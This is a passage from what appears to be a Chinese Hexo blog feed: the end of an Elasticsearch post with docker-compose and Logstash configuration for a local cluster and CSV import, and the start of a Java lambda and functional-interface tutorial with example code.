class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2.2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">cerebro:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">lmenezes/cerebro:0.8.3</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">cerebro</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9000:9000"</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-Dhosts.0.host=http://elasticsearch:9200</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">es7net</span></span><br><span class="line">  <span class="attr">kibana:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/kibana/kibana:7.1.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">kibana7</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">I18N_LOCALE=zh-CN</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">XPACK_GRAPH_ENABLED=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TIMELION_ENABLED=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">XPACK_MONITORING_COLLECTION_ENABLED="true"</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5601:5601"</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">es7net</span></span><br><span class="line">  <span class="attr">elasticsearch:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch:7.1.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">es7_01</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.name=xiaoxiao</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">node.name=es7_01</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bootstrap.memory_lock=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"ES_JAVA_OPTS=-Xms512m -Xmx512m"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">discovery.seed_hosts=es7_01,es7_02</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.initial_master_nodes=es7_01,es7_02</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">memlock:</span></span><br><span class="line">        <span class="attr">soft:</span> <span class="number">-1</span></span><br><span class="line">        <span class="attr">hard:</span> <span class="number">-1</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">es7data1:/usr/share/elasticsearch/data</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9200</span><span class="string">:9200</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">es7net</span></span><br><span class="line">  <span class="attr">elasticsearch2:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch:7.1.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">es7_02</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.name=xiaoxiao</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">node.name=es7_02</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bootstrap.memory_lock=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"ES_JAVA_OPTS=-Xms512m -Xmx512m"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">discovery.seed_hosts=es7_01,es7_02</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.initial_master_nodes=es7_01,es7_02</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">memlock:</span></span><br><span class="line">        <span class="attr">soft:</span> <span class="number">-1</span></span><br><span class="line">        <span class="attr">hard:</span> <span class="number">-1</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">es7data2:/usr/share/elasticsearch/data</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">es7net</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">es7data1:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">es7data2:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">local</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">es7net:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br></pre></td></tr></table></figure><p>启动命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up      #启动</span><br><span class="line">docker-compose down    #停止容器</span><br><span class="line">docker-compose down -v #停止容器并且移除数据</span><br></pre></td></tr></table></figure><h3 id="2-启动服务"><a href="#2-启动服务" class="headerlink" title="2.启动服务"></a>2.启动服务</h3><p>查看是否成功</p><p><strong>es访问地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:9200  #ES默认端口为9200</span><br></pre></td></tr></table></figure><p><img src="/img/es/es0-0.png" alt="es0"> </p><p><strong>kibana访问地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:5601 #kibana默认端口5601</span><br></pre></td></tr></table></figure><p><img src="/img/es/es0-1.png" alt="es1"> </p><p><strong>cerebro访问地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:9000 #cerebro默认端口9000</span><br></pre></td></tr></table></figure><p><img src="/img/es/es0-2.png" alt="es2"> </p><h3 id="3-Logstash安装与数据导入ES"><a href="#3-Logstash安装与数据导入ES" class="headerlink" title="3.Logstash安装与数据导入ES"></a>3.Logstash安装与数据导入ES</h3><font color="#dd0000">注：Logstash和kibana下载的版本要和你的elasticsearch的版本号一一致。</font><h4 id="3-1-配置movices-yml"><a href="#3-1-配置movices-yml" class="headerlink" title="3.1 配置movices.yml"></a>3.1 配置movices.yml</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># input代表读取数据 这里读取数据的位置在data文件夹下，文件名称为movies.csv</span><br><span class="line">input &#123;</span><br><span class="line">  file &#123;</span><br><span class="line">    path &#x3D;&gt; &quot;&#x2F;Users&#x2F;xub&#x2F;opt&#x2F;logstash-7.1.0&#x2F;data&#x2F;movies.csv&quot;</span><br><span class="line">    start_position &#x3D;&gt; &quot;beginning&quot;</span><br><span class="line">    sincedb_path &#x3D;&gt; &quot;&#x2F;dev&#x2F;null&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">filter &#123;</span><br><span class="line">  csv &#123;</span><br><span class="line">    separator &#x3D;&gt; &quot;,&quot;</span><br><span class="line">    columns &#x3D;&gt; [&quot;id&quot;,&quot;content&quot;,&quot;genre&quot;]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mutate &#123;</span><br><span class="line">    split &#x3D;&gt; &#123; &quot;genre&quot; &#x3D;&gt; &quot;|&quot; &#125;</span><br><span class="line">    remove_field &#x3D;&gt; [&quot;path&quot;, &quot;host&quot;,&quot;@timestamp&quot;,&quot;message&quot;]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mutate &#123;</span><br><span class="line"></span><br><span class="line">    split &#x3D;&gt; [&quot;content&quot;, &quot;(&quot;]</span><br><span class="line">    add_field &#x3D;&gt; &#123; &quot;title&quot; &#x3D;&gt; &quot;%&#123;[content][0]&#125;&quot;&#125;</span><br><span class="line">    add_field &#x3D;&gt; &#123; &quot;year&quot; &#x3D;&gt; &quot;%&#123;[content][1]&#125;&quot;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mutate &#123;</span><br><span class="line">    convert &#x3D;&gt; &#123;</span><br><span class="line">      &quot;year&quot; &#x3D;&gt; &quot;integer&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    strip &#x3D;&gt; [&quot;title&quot;]</span><br><span class="line">    remove_field &#x3D;&gt; [&quot;path&quot;, &quot;host&quot;,&quot;@timestamp&quot;,&quot;message&quot;,&quot;content&quot;]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"># 输入位置 这里输入数据到本地es ,并且索引名称为movies</span><br><span class="line">output &#123;</span><br><span class="line">   elasticsearch &#123;</span><br><span class="line">     hosts &#x3D;&gt; &quot;http:&#x2F;&#x2F;localhost:9200&quot;</span><br><span class="line">     index &#x3D;&gt; &quot;movies&quot;</span><br><span class="line">     document_id &#x3D;&gt; &quot;%&#123;id&#125;&quot;</span><br><span class="line">   &#125;</span><br><span class="line">  stdout &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动命令: 启动命令会和配置文件movices.yml的摆放位置有关，进入bin目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;logstash ..&#x2F;movices.yml</span><br></pre></td></tr></table></figure><p><strong>movices.yml存放的位置</strong></p><p><img src="/img/es/es0-3.png" alt="es3"> </p><p><strong>启动成功</strong></p><p><img src="/img/es/es0-4.png" alt="es4"> </p>]]></content>
      
      
      <categories>
          
          <category> Elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-lambda函数式编程</title>
      <link href="/2023/05/13/java-lambda%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/05/13/java-lambda%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>java函数式编程可以简单概括:</p><p><strong>基本函数 + lambda表达式 + 方法引用 + stream API = java函数式编程</strong></p><p>本文介绍<code>java.util.function</code>包下常用的函数式接口及其实战</p><h2 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h2><p><a href="https://www.matools.com/file/manual/jdk_api_1.8_google/java/util/function/package-summary.html" target="_blank" rel="noopener">完整文档地址</a></p><div class="table-container"><table><thead><tr><th style="text-align:left">接口</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">Predicate<T></td><td style="text-align:left">表示一个参数的谓词（布尔值函数）。</td></tr><tr><td style="text-align:left">Consumer<T></td><td style="text-align:left">表示接受单个输入参数并且不返回结果的操作。</td></tr><tr><td style="text-align:left">Function<T,R></td><td style="text-align:left">表示接受一个参数并产生结果的函数。</td></tr><tr><td style="text-align:left">Supplier<T></td><td style="text-align:left">代表结果供应商。</td></tr><tr><td style="text-align:left">UnaryOperator<T></td><td style="text-align:left">表示对单个操作数产生与其操作数相同类型的结果的操作。</td></tr><tr><td style="text-align:left">BiFunction<T,U,R></td><td style="text-align:left">表示接受两个参数并产生结果的函数。</td></tr><tr><td style="text-align:left">BinaryOperator<T></td><td style="text-align:left">表示对同一类型的两个操作数的操作，产生与操作数相同类型的结果。</td></tr><tr><td style="text-align:left">IntFunction<R></td><td style="text-align:left">表示一个接受int值参数并产生结果的函数。</td></tr><tr><td style="text-align:left">DoubleConsumer</td><td style="text-align:left">表示接受单个 <code>double</code>值参数的操作，不返回任何结果。</td></tr><tr><td style="text-align:left">DoubleFunction<R></td><td style="text-align:left">表示接受双值参数并产生结果的函数。</td></tr><tr><td style="text-align:left">BiConsumer<T,U></td><td style="text-align:left">表示接受两个输入参数并且不返回结果的操作。</td></tr></tbody></table></div><p> 以上是在函数式编程中的基本函数模型，我们大可以将其与数学函数做关联：y = x +1，我们仅仅需要关注这个函数的输入输出即可。 以predicte函数举例：该函数输入一个表达式，输出一个布尔类型 一元函数function：输入一个类型参数输出为另一个类型，当然这两个类型可以是相同的，当相同时也可以使用unaryOperator来代替。具体下面有给出实际场景的代码断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FunctionDemo</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">        <span class="comment">//断言型</span></span><br><span class="line"><span class="comment">// predicate();</span></span><br><span class="line">        <span class="comment">//消费型</span></span><br><span class="line"><span class="comment">// consumer();</span></span><br><span class="line">        <span class="comment">//一元函数 输入输出不同</span></span><br><span class="line"><span class="comment">// function();</span></span><br><span class="line">        <span class="comment">//提供型</span></span><br><span class="line"><span class="comment">// supplier();</span></span><br><span class="line">        <span class="comment">//一元函数 输入输出类型相同</span></span><br><span class="line"><span class="comment">// unaryOperator();</span></span><br><span class="line">        <span class="comment">//二元函数 输入输出不同</span></span><br><span class="line"><span class="comment">// biFunction();</span></span><br><span class="line">        <span class="comment">//二元函数 输入输出相同</span></span><br><span class="line">        binaryOperator();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">predicate</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Predicate&lt;Integer&gt; predicate = i -&gt; i &gt; <span class="number">0</span>;</span><br><span class="line">        IntPredicate intPredicate = i -&gt; i &gt; <span class="number">0</span>;</span><br><span class="line">        System.out.print(predicate.test(<span class="number">6</span>));</span><br><span class="line">        System.out.print(intPredicate.test(-<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">consumer</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Consumer&lt;String&gt; consumer = s -&gt; System.out.println(s);</span><br><span class="line">        consumer.accept(<span class="string">"我是一个消费者"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">function</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Function&lt;Integer,String&gt; function = x -&gt; <span class="string">"数字是："</span>+ x;</span><br><span class="line">        System.out.println(function.apply(<span class="number">88</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">supplier</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Supplier&lt;String&gt; supplier = () -&gt; <span class="string">"我是一个提供者"</span>;</span><br><span class="line">        System.out.println(supplier.get());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unaryOperator</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        UnaryOperator&lt;Integer&gt; unaryOperator = x -&gt; ++x;</span><br><span class="line">        System.out.println(unaryOperator.apply(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">biFunction</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        BiFunction&lt;Integer,Double,Double&gt; biFunction = (x,y) -&gt; &#123; </span><br><span class="line">   </span><br><span class="line">            ++x;</span><br><span class="line">            ++y;</span><br><span class="line">            <span class="keyword">return</span> x+y;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(biFunction.apply(<span class="number">1</span>,<span class="number">2.3</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">binaryOperator</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntBinaryOperator intBinaryOperator = (x,y) -&gt; x + y;</span><br><span class="line">        System.out.println(intBinaryOperator.applyAsInt(<span class="number">2</span>,<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        Map&lt;Function&lt;Model, String&gt;, BiConsumer&lt;Model, String&gt;&gt; getFunctionMap() &#123;</span><br><span class="line">        HashMap&lt;Function&lt;Model, String&gt;, BiConsumer&lt;Model, String&gt;&gt; functionMap = Maps.newHashMap();</span><br><span class="line">        functionMap.put(Model::getJul, Model::setJul);</span><br><span class="line">        functionMap.put(Model::getAug, Model::setAug);</span><br><span class="line">        functionMap.put(Model::getSep, Model::setSep);</span><br><span class="line">        functionMap.put(Model::getOct, Model::setOct);</span><br><span class="line">        functionMap.put(Model::getNov, Model::setNov);</span><br><span class="line">        functionMap.put(Model::getDec, Model::setDec);</span><br><span class="line">        functionMap.put(Model::getJan, Model::setJan);</span><br><span class="line">        functionMap.put(Model::getFeb, Model::setFeb);</span><br><span class="line">        functionMap.put(Model::getMar, Model::setMar);</span><br><span class="line">        functionMap.put(Model::getApr, Model::setApr);</span><br><span class="line">        functionMap.put(Model::getMay, Model::setMay);</span><br><span class="line">        functionMap.put(Model::getJun, Model::setJun);</span><br><span class="line">        <span class="keyword">return</span> functionMap;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tranfer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Map&lt;Function&lt;OverheadCostUnionCategoryVO, String&gt;, BiConsumer&lt;OverheadCostUnionCategoryVO, String&gt;&gt; functionMap = getFunctionMap();</span><br><span class="line">        functionMap.forEach((k, v) -&gt; doSomething(k, v));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">doSomething</span><span class="params">(Function&lt;OverheadCostUnionCategoryVO, String&gt; k, BiConsumer&lt;OverheadCostUnionCategoryVO, String&gt;&gt; setMethod)</span> </span>&#123;</span><br><span class="line">        setMethod.accept(child, stripTrailingZeros(total));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="lambda表达式"><a href="#lambda表达式" class="headerlink" title="lambda表达式"></a>lambda表达式</h2><h3 id="lambda表达式组成"><a href="#lambda表达式组成" class="headerlink" title="lambda表达式组成"></a>lambda表达式组成</h3><p>形如以下：</p><blockquote><p>(o1,o2) -&gt; Integer.compare(o1,o2)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">左边 -&gt; 右边</span><br></pre></td></tr></table></figure></blockquote><ul><li><code>-&gt;</code> 被称为lambda操作符或箭头操作符</li><li><code>左边</code>：lambda形参列表（其实就是接口中的抽象方法的形参列表）</li><li><code>右边</code>：lambda体 （其实就是重写的抽象方法的方法体）</li></ul><h3 id="lambda表达式使用"><a href="#lambda表达式使用" class="headerlink" title="lambda表达式使用"></a>lambda表达式使用</h3><h4 id="1-无参无返回值"><a href="#1-无参无返回值" class="headerlink" title="1.无参无返回值"></a>1.无参无返回值</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Runnable ri = <span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">"好好学习，天天向上"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        ri.run();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span></span>&#123;</span><br><span class="line">       Runnable r2 = ()-&gt; &#123;System.out.println(<span class="string">"学会lambda，快乐每一天"</span>);&#125;；</span><br><span class="line">       r2.run();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="2-需要一个参数但无返回值"><a href="#2-需要一个参数但无返回值" class="headerlink" title="2. 需要一个参数但无返回值"></a>2. 需要一个参数但无返回值</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test05</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Consumer&lt;String&gt; consumer = <span class="keyword">new</span> Consumer&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">                System.out.println(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        consumer.accept(<span class="string">"这一路上走走停停"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test06</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Consumer&lt;String&gt; consumer = (String s)-&gt;&#123;System.out.println(s);&#125;；</span><br><span class="line">        consumer.accept(<span class="string">"留下少年漂流的痕迹"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="3-数据类型可以省略，由编译器去推断出，称为“类型推断”"><a href="#3-数据类型可以省略，由编译器去推断出，称为“类型推断”" class="headerlink" title="3.数据类型可以省略，由编译器去推断出，称为“类型推断”"></a>3.数据类型可以省略，由编译器去推断出，称为“类型推断”</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test05</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Consumer&lt;String&gt; consumer = <span class="keyword">new</span> Consumer&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">                System.out.println(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        consumer.accept(<span class="string">"这一路上走走停停"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test06</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Consumer&lt;String&gt; consumer = (s)-&gt;&#123;System.out.println(s);&#125;；<span class="comment">//类型推断</span></span><br><span class="line">        consumer.accept(<span class="string">"留下少年漂流的痕迹"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="4-lambda若只需要一个参数时，参数的小括号可以省略"><a href="#4-lambda若只需要一个参数时，参数的小括号可以省略" class="headerlink" title="4.lambda若只需要一个参数时，参数的小括号可以省略"></a>4.lambda若只需要一个参数时，参数的小括号可以省略</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test05</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Consumer&lt;String&gt; consumer = <span class="keyword">new</span> Consumer&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">                System.out.println(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        consumer.accept(<span class="string">"这一路上走走停停"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test06</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Consumer&lt;String&gt; consumer = s-&gt;&#123;System.out.println(s);&#125;；<span class="comment">//类型推断</span></span><br><span class="line">        consumer.accept(<span class="string">"留下少年漂流的痕迹"</span>);</span><br><span class="line">    